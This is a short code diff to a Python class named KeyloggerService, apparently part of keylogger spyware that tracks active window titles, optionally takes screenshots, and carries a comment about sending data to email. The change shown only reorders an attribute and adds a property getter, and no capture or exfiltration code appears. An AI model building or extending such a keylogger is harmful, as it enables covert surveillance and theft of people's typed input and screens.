@@ -10,14 +10,18 @@ from PIL import ImageGrab
 class KeyloggerService:
     # send mac to email
     def __init__(self, if_screenshot=True):
+        self.__if_screenshot = if_screenshot
         self.__action = False
         self.__data = {}
         self.__current_window = pygetwindow.getActiveWindowTitle()
         self.__prev_window = None
-        self.__if_screenshot = if_screenshot
 
 
 
+
+    @property
+    def action(self):
+        return self.__action
 
     @property
     def data(self):
